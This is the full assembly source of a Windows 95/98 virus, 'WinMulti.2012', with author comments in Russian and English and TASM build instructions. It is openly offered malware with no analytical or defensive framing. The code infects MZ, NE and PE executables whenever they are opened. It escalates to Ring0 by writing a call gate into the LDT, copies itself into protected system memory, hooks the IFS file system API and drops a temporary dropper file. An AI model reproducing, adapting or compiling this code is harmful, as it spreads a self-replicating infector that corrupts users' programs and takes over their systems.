DEBUG =	0	; 1 - включить отладочный режим
		; 0 - выключить отладочный режим

COMMENT %

  MZ-EXE.NE-EXE.PE-EXE.R0-TSR. Infects MZ-EXE files by appending
  to the end of file, NE-EXE by creating of new segment at the
  end of file and PE-EXE by appending to the last section.
  Operates under Windows95/98 only. At starting from MZ-EXE:
  creating of temporary dropper, V86->PROT16 (by using of DPMI calls), 
  PROT16->PROT32R0 (by creating of callgate at the LDT).
  At starting from NE-EXE: PROT16->PROT32R0. At starting from
  PE-EXE: installing of SEH, PROT32R3->PROT32R0. When entered Ring0, 
  virus installs itself into system memory and hooks IFS.


   Перед вами моя вторая попытка создания вируса для Windows95. Так получилось,
что этот вирус выходит в свет раньше предыдущего (там нужно кое-что доделать),
ну а этот продукт тоже будет потом дорабатываться. Вирус является в некотором
роде мультиплатформенным. Он заражает MZ, NE и PE-EXE, но работоспособен только
под Windows95/98. Заражение происходит при открытии файла. Обрабатываются файлы
с атрибутом "ReadOnly". Атрибуты файла не изменяются. Заражение файлов:

 * MZ-EXE. Стандартным образом дописывается в конец файла и корректирует MZ-EXE
   заголовок.
 * NE-EXE. Добавляет в таблицу сегментов описание еще одного сегмента. Далее
   корректирует NE-EXE заголовок и дописывается в конец файла.
 * PE-EXE. Дописывается к последней секции и корректирует PE-EXE заголовок и
   дескриптор последней секции.

Вирус резидентный. Установка в память осуществляется следующим образом:

 * PE-EXE. Обработчик исключений (SEH) устанавливается на вирус, чтобы не
   допустить глюков под WindowsNT. В 1-ом дескрипторе LDT создается шлюз
   вызова (CallGate), который указывает на процедуру Ring0. При вызове этого
   CallGate процедура Ring0 получает управление с привелегиями нулевого
   кольца. Эта процедура выделяет страницу памяти в области выше 2Gb, защищает
   ее от чтения из 3-го кольца и копирует туда вирус. Затем перехватывыается
   обработчик IFS и устанавливается обработчик порта 28h (чтобы определять
   присутствие копии вируса в памяти). Далее происходит возврат в 3-е кольцо,
   и управление отдается файлу-носителю.
 * NE-EXE. То же самое, что и в PE-EXE, только шлюз вызова создается с помощью
   DPMI-вызовов.
 * MZ-EXE. На диск сбрасывается и запускается дроппер с вирусом, в начале
   которого расположена процедура перехода в нулевое кольцо. Эта процедура
   выполняет переход в защищенный режим. Далее все происходит так же, как в
   NE-EXE. После этого дроппер удаляется с диска, а управление передается
   программе-носителю.

                                  DJ Sadovnikov (http://i.am/djsad), 12.12.2000

 ══════════════════════════════════════════════════════════════════════════════       

                 Компилировать с помощью TASM 4.1+

                    tasm /m winmulti.asm
                    tlink /3 /x winmulti.obj
                    del winmulti.obj


                 Файлы из архива:

                    winmulti.asm 23000 (исходник вируса)
                    winmulti.exe  2557 (бинарник вируса)
                    winmulti.doc 10870 (техническая информация)
%












;══════════════════════════════════════════════════════════════════════════════

		.386p
Code16		segment byte use16
		assume	cs:Code16, ds:Code16


Start:		mov	ah, 9
		mov	dx, offset Msg+100h
		int	21h
		mov	ax, 4C00h
		int	21h

Msg		db	'Virus has started...$'

;══════════════════════════════════════════════════════════════════════════════





















;══════════════════════════════════════════════════════════════════════════════
;                ДРОППЕР ДЛЯ ПЕРЕХОДА ИЗ V86 В RING0
;══════════════════════════════════════════════════════════════════════════════

;[Укорачиваем текущий блок памяти]

Start16:	mov	ah, 4Ah
		mov	bx, 1000h
		int	21h
		jc	Terminate


;[Получаем адрес DPMI]

		mov	ax, 1687h
		int	2Fh
		or	ax, ax
		jnz	Terminate
		mov	ds:[OfsDPMI-Start16+100h], di
		mov	ds:[SegDPMI-Start16+100h], es


;[Выделяем память для данных DPMI]

		mov	ah, 48h
		mov	bx, si
		int	21h
		jc	Terminate
		mov	ds, ax
		mov	es, ax


;[Переходим в защищенный режим]

		xor	ax, ax
		db	9Ah
OfsDPMI		dw	0
SegDPMI		dw	0
		jc	Terminate


;[Устанавливаем вирус в память]

		call	EnterR0


;[Отдаем управление DOS]

Terminate:	mov	ax, 4C00h
		int	21h

;══════════════════════════════════════════════════════════════════════════════





















;══════════════════════════════════════════════════════════════════════════════
;            ТРАНЗИТНАЯ ЧАСТЬ ДЛЯ ПЕРЕХОДА ИЗ PROT16 В PROT32
;══════════════════════════════════════════════════════════════════════════════

EnterR0:	call	Entry1
Entry1:		pop	si
		sub	si, Entry1-Start16


;[Создаем дополнительный дескриптор]

		mov	ax, 0Ah
		mov	bx, cs
		int	31h
		mov	ds, ax


;[Сохраняем в стеке размер и адрес GDT]

		sub	sp, 6
		mov	bp, sp
		sgdt	[bp]


;[Устанавливаем новый размер сегмента DS]

		mov	ax, 8
		mov	bx, ds
		xor	cx, cx
		pop	dx
		int	31h


;[Устанавливаем сегмент DS на GDT]

		mov	ax, 7
		mov	bx, ds
		pop	dx
		pop	cx
		int	31h


;[Получаем адрес LDT]

		sldt	bx
		and	bl, 11111000b
		jz	Error
		mov	cl, ds:[bx+4]
		mov	ch, ds:[bx+7]
		mov	dx, ds:[bx+2]


;[Устанавливаем сегмент DS на LDT]

		mov	ax, 7
		mov	bx, ds
		int	31h


;[Сохраняем первый дескриптор в LDT]

		push	dword ptr ds:[0]
		push	dword ptr ds:[4]


;[Вычисляем линейный адрес метки Ring0]

		mov	ax, 6
		mov	bx, cs
		int	31h
		lea	ax, [(Ring0-Start32)+(EndCode16-Start16)+si]
		add	dx, ax
		adc	cx, 0


;[Создаем в первом дескрипторе LDT шлюз вызова]

		mov	ds:[0], dx
		mov	ds:[2], (11101100b shl 24) + 28h
		mov	ds:[6], cx


;[Переходим в нулевое кольцо]

		db	9Ah
		dw	0
		dw	00000111b


;[Восстанавливаем первый дескриптор LDT]

		pop	dword ptr ds:[4]
		pop	dword ptr ds:[0]


;[Уничтожаем созданный ранее дополнительный дескриптор]

Error:		mov	ax, 1
		mov	bx, ds
		int	31h
		ret

;══════════════════════════════════════════════════════════════════════════════





















;══════════════════════════════════════════════════════════════════════════════
;                     ТРАНЗИТНАЯ ЧАСТЬ ДЛЯ MZ-EXE
;══════════════════════════════════════════════════════════════════════════════

StartMZ:	pusha
		push	ds es

		call	Entry2
Entry2:		pop	si
		sub	si, Entry2-Start16


;[Проверяем наличие вируса в памяти]

		in	ax, 28h
		cmp	ax, 0ABCDh
		je	QuitMZ


;[Получаем версию Windows]

		mov	ax, 1600h
		int	2Fh
		cmp	al, 4
		jne	QuitMZ


;[Укорачиваем текущий блок памяти]

		mov	ax, ds
		dec	ax
		mov	ds, ax
		mov	bx, ds:[3]
		sub	bx, 2000h
		mov	ah, 4Ah
		int	21h
		jc	QuitMZ


;[Создаем файл для дроппера]

		mov	ah, 3Ch
		xor	cx, cx
		lea	dx, [FName-Start16+si]
		push	cs
		pop	ds
		int	21h
		jc	QuitMZ
		xchg	bx, ax


;[Записываем в него код вируса]

		mov	ah, 40h
		mov	cx, CodeSize
		mov	dx, si
		int	21h
		jc	QuitMZ


;[Закрываем файл]

		mov	ah, 3Eh
		int	21h
		jc	QuitMZ


;[Подготавливаем блок параметров для запуска дроппера]

		lea	bx, [PBlock-Start16+si]
		mov	ds:[bx+04h], cs
		mov	ds:[bx+08h], cs
		mov	ds:[bx+0Ch], cs


;[Запускаем дроппер]

		mov	ax, 4B00h
		lea	dx, [FName-Start16+si]
		push	cs
		pop	es
		int	21h


;[Удаляем дроппер]

		mov	ah, 41h
		lea	dx, [FName-Start16+si]
		int	21h


;[Отдаем управление файлу-носителю]

QuitMZ:		pop	es ds

		mov	ax, es
		add	ax, 10h
		add	cs:[OldCSIP+2-Start16+si], ax
		add	cs:[OldSS+1-Start16+si], ax

		popa
		jmp	$+2

		cli
OldSS:		mov	sp, 0
		mov	ss, sp
OldSP:		mov	sp, 0
		sti

		db	0EAh
OldCSIP		dd	0


PBlock		dw	0
		dw	80h, 0
		dw	5Ch, 0
		dw	6Ch, 0

FName		db	'DJ.SAD',0

;══════════════════════════════════════════════════════════════════════════════





















;══════════════════════════════════════════════════════════════════════════════
;                     ТРАНЗИТНАЯ ЧАСТЬ ДЛЯ NE-EXE
;══════════════════════════════════════════════════════════════════════════════

StartNE:	pusha
		push	ds es


;[Проверяем наличие вируса в памяти]

		in	ax, 28h
		cmp	ax, 0ABCDh
		je	QuitNE


;[Получаем версию Windows]

		mov	ax, 1600h
		int	2Fh
		cmp	al, 4
		jne	QuitNE


;[Проверяем наличие DPMI]

		mov	ax, 1686h
		int	2Fh
		or	ax, ax
		jnz	QuitNE


;[Устанавливаем вирус в память]

		call	EnterR0


;[Отдаем управление файлу-носителю]

QuitNE:		pop	es ds
		popa

		db	0EAh
ReloCSIP	dd	0

EndCode16	=	$

Code16		ends

;══════════════════════════════════════════════════════════════════════════════





















;══════════════════════════════════════════════════════════════════════════════
;                    ТРАНЗИТНАЯ ЧАСТЬ ДЛЯ PE-EXE
;══════════════════════════════════════════════════════════════════════════════

Code32		segment	byte use32
		assume	cs:Code32, ds:Code32

Start32		=	$

StartPE:	pushfd
		pushad


;[Устанавливаем обработчик исключений]

		call	Seh
		mov	esp, [esp+8]
		jmp	QuitPE
Seh:		push	dword ptr fs:[0]
		mov	fs:[0], esp


;[Проверяем наличие вируса в памяти]

		in	ax, 28h
		cmp	ax, 0ABCDh
		je	QuitPE


;[Вычисляем EIP]

		call	Entry3
Entry3:		pop	ebp
		sub	ebp, Entry3-Start32


;[Вычисляем адрес LDT]

		push	ebx
		sgdt	[esp-2]
		pop	ebx
		xor	eax, eax
		sldt	ax
		and	al, 11111000b
		jz	QuitPE

		add	ebx, eax
		mov	eax, [ebx+1]
		mov	al, [ebx+7]
		ror	eax, 8
		xchg	edi, eax


;[Сохраняем первый дескриптор LDT]

		push	dword ptr [edi]
		push	dword ptr [edi+4]


;[Создаем в первом дескрипторе LDT шлюз вызова]

		lea	eax, [Ring0-Start32+ebp]
		mov	[edi], eax
		mov	[edi+4], eax
		mov	[edi+2], (11101100b shl 24) + 28h


;[Переходим в нулевое кольцо]

		db	9Ah
		dd	0
		dw	00000111b


;[Восстанавливаем первый дескриптор LDT]

		pop	dword ptr [edi+4]
		pop	dword ptr [edi]


;[Отдаем управление файлу-носителю]

QuitPE:		pop	dword ptr fs:[0]
		pop	eax			; Fixup stack

		popad
		popfd

		db	0E9h
RetAddress	dd	0

;══════════════════════════════════════════════════════════════════════════════





















;══════════════════════════════════════════════════════════════════════════════
;                    ТРАНЗИТНАЯ ЧАСТЬ ДЛЯ RING0
;══════════════════════════════════════════════════════════════════════════════

Ring0:		pushad
		push	ds es
		push	ss ss
		pop	ds es


;[Вычисляем EIP]

		call	Entry4
Entry4:		pop	ebp
		sub	ebp, Entry4-Start32


;[Выделяем память]

		push	9
		xor	eax, eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		inc	eax
		push	eax
		push	large MemSize
		push	00010053h		; _PageAllocate
		call	VxDcall
		add	esp, 4*8
		or	eax, eax
		jz	Quit


;[Сбрасываем флажок занятости]

		mov	byte ptr [Busy-Start32+ebp], 0


;[Копируем код в память]

		mov	edi, eax
		lea	esi, [Start16-EndCode16+ebp]
		mov	ecx, CodeSize
		cld
		rep	movsb
		mov	edi, eax


;[Защищаем страницу от чтения из 3-го кольца]

		push	20000000h
		push	not 00060000h
		push	large MemSize
		shr	eax, 12
		push	eax
		push	00010133h		; _PageModifyPermisions
		call	VxDcall
		add	esp, 4*4


;[Устанавливаем обработчик порта 28h]

		lea	esi, [(Port28h-Start32)+(EndCode16-Start16)+edi]
		mov	edx, 28h
		push	00010096h		; Install_IO_Handler
		call	VxDcall
		jc	Quit


;[Устанавливаем свой обработчик IFS]

		lea	eax, [(ApiHook-Start32)+(EndCode16-Start16)+edi]
		push	eax
		push	00400067h		; InstallFileSystemApiHook
		call	VxDcall
		mov	[(PrevHook-Start32)+(EndCode16-Start16)+edi], eax
		pop	eax


Quit:		pop	es ds
		popad
		retf

;══════════════════════════════════════════════════════════════════════════════





















;══════════════════════════════════════════════════════════════════════════════
;                             ОБРАБОТЧИКИ
;══════════════════════════════════════════════════════════════════════════════

Port28h:	mov	ax, 0ABCDh
		ret


;[Проверяем, какую функцию пытаются выполнить]

ApiHook:	cmp	[esp+08h], dword ptr 0024h	; FileOpen
		jne	Exit1


;[Вычисляем EIP]

		pushad
		call	Entry5
Entry5:		pop	ebp
		sub	ebp, Entry5-Start32


;[Устанавливаем флажок занятости]

		cmp	byte ptr [Busy-Start32+ebp], 0FFh
		je	Exit2
		not	byte ptr [Busy-Start32+ebp]


;[Определяем букву диска]

		lea	esi, [FileName-Start32+ebp]
		mov	al, [esp+0Ch+20h]
		cmp	al, 0
		jle	Exit3
		add	al, 'A'-1
		mov	ah, ':'
		mov	[esi], ax


;[Преобразовываем кодировку]

		mov	eax, [esp+18h+20h]
		mov	eax, [eax+0Ch]
		add	eax, 4
		push	dword ptr [esp+14h+20h]
		push	254
		push	eax
		lea	eax, [esi+2]
		push	eax
		push	00400041h		; UniToBCSPath
		call	VxDcall
		add	esp, 4*4
		or	edx, edx
		jnz	Exit3
		mov	[esi+eax+2], byte ptr 0


;[Проверяем расширение файла]

		cmp	[esi+eax-2], 'EXE.'
IF DEBUG
		org	$-4
		dd	'XXX.'
ENDIF
		jne	Exit3


;[Если это KRNL386.EXE, то выходим]

		cmp	[esi+eax-9], 'LNRK'
		je	Exit3


;[Получаем атрибуты файла]

		mov	ax, 4300h		; R0_GetFileAttributes
		call	FileIO
		jc	Exit3
		push	ecx
		push	esi


;[Обнуляем атрибуты файла]

		mov	ax, 4301h		; R0_SetFileAttributes
		xor	ecx, ecx
		call	FileIO
		jc	RestAttr


;[Открываем файл]

		mov	eax, 0D500h		; R0_OpenCreateFile
		mov	bx, 2022h
		mov	dx, 1
		call	FileIO
		jc	RestAttr
		xchg	ebx, eax


;[Считываем MZ заголовок]

		mov	ecx, DosHeaderSize
		xor	edx, edx
		lea	esi, [DosHeader-Start32+ebp]
		call	Read
		jc	Close


;[Проверяем тип файла и его зараженность]

		cmp	[DosHeader-Start32+00h+ebp], word ptr 'ZM'
		jne	Close
		cmp	[DosHeader-Start32+12h+ebp], word ptr 6666h
		je	Close


;[Считываем четыре байта по смещению 3Ch от начала файла]

		mov	ecx, 4
		mov	edx, 3Ch
		lea	esi, [WinHeaderOfs-Start32+ebp]
		call	Read
		jc	Close


;[Считываем PE заголовок]

		mov	ecx, WinHeaderSize
		mov	edx, [WinHeaderOfs-Start32+ebp]
		lea	esi, [WinHeader-Start32+ebp]
		call	Read
		jc	Close
		cmp	eax, ecx
		jne	InfectMZ


;[Проверяем тип файла]

		mov	ax, [WinHeader-Start32+ebp]
		cmp	ax, 'EP'
		je	InfectPE
		cmp	ax, 'EN'
		je	InfectNE
		cmp	ax, 'EL'
		je	Close
		cmp	ax, 'XL'
		jne	InfectMZ


;[Закрываем файл]

Close:		mov	eax, 0D700h			; R0_CloseFile
		call	FileIO


;[Восстанавливаем атрибуты файла]

RestAttr:	mov	ax, 4301h
		pop	esi
		pop	ecx
		call	FileIO


;[Сбрасываем флажок занятости и передаем управление дальше]

Exit3:		not	byte ptr [Busy-Start32+ebp]
Exit2:		popad
Exit1:		dw	25FFh
PrevHook	dd	0

;══════════════════════════════════════════════════════════════════════════════





















;══════════════════════════════════════════════════════════════════════════════
;                           ЗАРАЖЕНИЕ ФАЙЛОВ
;══════════════════════════════════════════════════════════════════════════════

;[Проверяем, заражен ли файл]

InfectPE:	cmp	[WinHeader+58h-Start32+ebp], '6666'
		je	Close


;[Вычисляем смещение последнего элемента в таблице объектов]

		xor	eax, eax
		imul	ax, [WinHeader+06h-Start32+ebp], PEObjectSize
		add	ax, [WinHeader+14h-Start32+ebp]
		add	ax, 18h-PEObjectSize
		add	eax, [WinHeaderOfs-Start32+ebp]
		mov	[WinObjectOfs-Start32+ebp], eax


;[Считываем последний элемент таблицы объектов]

		xchg	edx, eax
		mov	ecx, PEObjectSize
		lea	esi, [WinObject-Start32+ebp]
		call	Read
		jc	Close


;[Сравниваем физический и виртуальный размеры объекта]

		mov	eax, [WinObject+10h-Start32+ebp]
		cmp	[WinObject+08h-Start32+ebp], eax
		jae	Skip
		mov	[WinObject+08h-Start32+ebp], eax


;[Сохраняем старую и вычисляем новую точку входа]

Skip:		add	eax, [WinObject+0Ch-Start32+ebp]
		add	eax, large (StartPE-Start32)+(EndCode16-Start16)
		mov	ecx, [WinHeader+28h-Start32+ebp]
		sub	ecx, eax
		sub	ecx, (RetAddress+4)-StartPE
		mov	[RetAddress-Start32+ebp], ecx
		mov	[WinHeader+28h-Start32+ebp], eax


;[Корректируем размер файла]

		add	eax, EndCode32-Start32
		mov	[WinHeader+50h-Start32+ebp], eax


;[Вычисляем смещение, по которому нужно записать вирус]

		mov	eax, [WinObject+14h-Start32+ebp]
		add	eax, [WinObject+10h-Start32+ebp]


;[Корректируем виртуальный и физический размеры последнего объекта]

		add	[WinObject+08h-Start32+ebp], large dword ptr CodeSize
		add	[WinObject+10h-Start32+ebp], large dword ptr CodeSize


;[Устанавливаем признак зараженности]

		mov	[WinHeader+58h-Start32+ebp], '6666'


;[Записываем код вируса в файл]

		call	WriteVirus1
		jc	Close


;[Записываем новый PE заголовок]

		mov	ecx, PEHeaderSize
		mov	edx, [WinHeaderOfs-Start32+ebp]
		lea	esi, [WinHeader-Start32+ebp]
		call	Write
		jc	Close


;[Записываем новый последний элемент таблицы объектов]

		mov	ecx, PEObjectSize
		mov	edx, [WinObjectOfs-Start32+ebp]
		lea	esi, [WinObject-Start32+ebp]
		call	Write
		jmp	Close

;══════════════════════════════════════════════════════════════════════════════

;[Проверяем, содержит ли файл оверлеи]

InfectMZ:	call	GetFSize
		jc	Close
		call	Calc
		cmp	[DosHeader+02h-Start32+ebp], eax
		jne	Close


;[Вычисляем длину файла с вирусом]

		call	GetFSize
		jc	Close
		add	eax, large CodeSize
		call	Calc
		mov	[DosHeader+02h-Start32+ebp], eax


;[Сохраняем SS, SP, CS и IP]

		mov	ax, [DosHeader+0Eh-Start32+ebp]
		mov	[OldSS-EndCode16+1+ebp], ax
		mov	ax, [DosHeader+10h-Start32+ebp]
		mov	[OldSP-EndCode16+1+ebp], ax
		mov	eax, [DosHeader+14h-Start32+ebp]
		mov	[OldCSIP-EndCode16+ebp], eax


;[Вычисляем новую точку входа]

		call	GetFSize
		jc	Close
		xor	edx, edx
		mov	ecx, 16
		div	ecx
		sub	ax, [DosHeader+08h-Start32+ebp]
		add	dx, StartMZ-Start16


;[Корректируем точку входа и адрес стека]

		mov	[DosHeader+16h-Start32+ebp], ax
		mov	[DosHeader+14h-Start32+ebp], dx
		mov	[DosHeader+0Eh-Start32+ebp], ax
		mov	[DosHeader+10h-Start32+ebp], word ptr CodeSize+100h


;[Устанавливаем признак зараженности]

		mov	[DosHeader+12h-Start32+ebp], word ptr 6666h


;[Записываем вирус в файл]

		call	GetFSize
		jc	Close
		call	WriteVirus1
		jc	Close


;[Записываем новый MZ заголовок]

		mov	ecx, DosHeaderSize
		xor	edx, edx
		lea	esi, [DosHeader-Start32+ebp]
		call	Write
		jmp	Close

;══════════════════════════════════════════════════════════════════════════════

;[Проверяем, заражен ли файл]

InfectNE:	cmp	[WinHeader+08h-Start32+ebp], '6666'
		je	Close


;[Проверяем операционную систему, для которой предназначен файл]

		test	[WinHeader+36h-Start32+ebp], byte ptr 00000010b
		jz	Close


;[Сохраняем стартовый адрес]

		mov	eax, [WinHeader+14h-Start32+ebp]
		ror	eax, 16
		mov	[ReloCSIP-EndCode16+ebp], 0FFFF0000h


;[Настраиваем Relocation Table]

		mov	[RelocTable+00h-Start32+ebp], 04030001h
		mov	[RelocTable+04h-Start32+ebp], word ptr (ReloCSIP-Start16)
		mov	[RelocTable+06h-Start32+ebp], eax


;[Увеличиваем смещение всех таблиц на один элемент]

		mov	ax, NEObjectSize
		add	[WinHeader+04h-Start32+ebp], ax
		add	[WinHeader+24h-Start32+ebp], ax
		add	[WinHeader+26h-Start32+ebp], ax
		add	[WinHeader+28h-Start32+ebp], ax
		add	[WinHeader+2Ah-Start32+ebp], ax
		sub	[WinHeaderOfs-Start32+ebp], ax


;[Увеличиваем количество сегментов и вычисляем новый стартовый адрес]

		mov	ax, [WinHeader+1Ch-Start32+ebp]
		inc	ax
		mov	[WinHeader+1Ch-Start32+ebp], ax
		mov	[WinHeader+16h-Start32+ebp], ax
		mov	[WinHeader+14h-Start32+ebp], word ptr (StartNE-Start16)


;[Устанавливаем признак зараженности]

		mov	[WinHeader+08h-Start32+ebp], '6666'


;[Записываем новый указатель на NE-EXE заголовок]

		mov	ecx, 4
		mov	edx, 3Ch
		lea	esi, [WinHeaderOfs-Start32+ebp]
		call	Write
		jc	Close


;[Записываем новый NE-EXE заголовок]

		mov	ecx, NEHeaderSize
		mov	edx, [WinHeaderOfs-Start32+ebp]
		lea	esi, [WinHeader-Start32+ebp]
		call	Write
		jc	Close


;[Вычисляем расположение таблицы сегментов]

		movzx	edx, word ptr [WinHeader+22h-Start32+ebp]
		mov	eax, [WinHeaderOfs-Start32+ebp]
		add	edx, eax


;[Сдвигаем таблицу сегментов назад на один дескриптор]

		mov	ecx, NEObjectSize
		lea	esi, [WinObject-Start32+ebp]
Shift:		add	edx, ecx
		call	Read
		jc	Close
		sub	edx, ecx
		call	Write
		jc	Close
		add	edx, ecx
		dec	word ptr [WinHeader+1Ch-Start32+ebp]
		cmp	word ptr [WinHeader+1Ch-Start32+ebp], 1
		jne	Shift
		mov	[WinObjectOfs-Start32+ebp], edx


;[Вычисляем смещение вируса в файле в блоках]

		call	GetFSize
		jc	Close
		mov	cl, [WinHeader+32h-Start32+ebp]
		shr	eax, cl
		inc	eax


;[Создаем дескриптор вирусного сегмента]

		mov	[WinObject+00h-Start32+ebp], ax
		mov	[WinObject+02h-Start32+ebp], word ptr CodeSize
		mov	[WinObject+04h-Start32+ebp], word ptr 0180h
		mov	[WinObject+06h-Start32+ebp], word ptr CodeSize


;[Записываем вирус в конец файла]

		shl	eax, cl
		mov	ecx, CodeSize+RelocTableSize
		call	WriteVirus2
		jc	Close


;[Записываем сегмент вируса в таблицу сегментов]

		mov	ecx, NEObjectSize
		mov	edx, [WinObjectOfs-Start32+ebp]
		lea	esi, [WinObject-Start32+ebp]
		call	Write
		jmp	Close

;══════════════════════════════════════════════════════════════════════════════





















;══════════════════════════════════════════════════════════════════════════════
;                             ПОДПРОГРАММЫ
;══════════════════════════════════════════════════════════════════════════════

Calc:		mov	ecx, 512
		xor	edx, edx
		div	ecx
		or	edx, edx
		jz	$+3
		inc	eax
		shl	eax, 16
		add	eax, edx
		ret


WriteVirus1:	mov	ecx, CodeSize
WriteVirus2:	xchg	edx, eax
		lea	esi, [Start16-EndCode16+ebp]
Write:		mov	eax, 0D601h		; R0_WriteFile
		jmp	FileIO
Read:		mov	eax, 0D600h		; R0_ReadFile
		jmp	FileIO
GetFSize:	mov	eax, 0D800h		; R0_GetFileSize
FileIO:		push	00400032h		; IFSmgr_Ring0_FileIO
		call	VxDcall
		ret


VxDcall:	mov	[Int20h-Start32+ebp], word ptr 20CDh
		pop	dword ptr [RetAddr-Start32+ebp]
		pop	dword ptr [VxDfunc-Start32+ebp]
Int20h		dw	0
VxDfunc		dd	0
		db	68h
RetAddr		dd	0
		ret

;══════════════════════════════════════════════════════════════════════════════





















;══════════════════════════════════════════════════════════════════════════════
;                                 ДАННЫЕ
;══════════════════════════════════════════════════════════════════════════════

VirName		db	'WinMulti.2012 -- Copyright (c) by DJ Sadovnikov'

EndCode32	=	$
CodeSize	=	(EndCode32-Start32)+(EndCode16-Start16)

RelocTableSize	=	0Ah
DosHeaderSize	=	18h
WinHeaderSize	=	5Ch		; MAX(PEHeaderSize,NEHeaderSize)
WinObjectSize	=	28h		; MAX(PEObjectSize,NEObjectSize)
PEHeaderSize	=	5Ch
NEHeaderSize	=	40h
PEObjectSize	=	28h
NEObjectSize	=	08h

RelocTable	db	RelocTableSize dup (?)	; Don't move this anywhere
DosHeader	db	DosHeaderSize dup (?)
WinHeader	db	WinHeaderSize dup (?)
WinObject	db	WinObjectSize dup (?)
FileName	db	256 dup (?)
WinHeaderOfs	dd	?
WinObjectOfs	dd	?
Busy		db	?

MemSize		=	(($-Start32)+(EndCode16-Start16))/4096+1

Code32		ends
		end	StartMZ
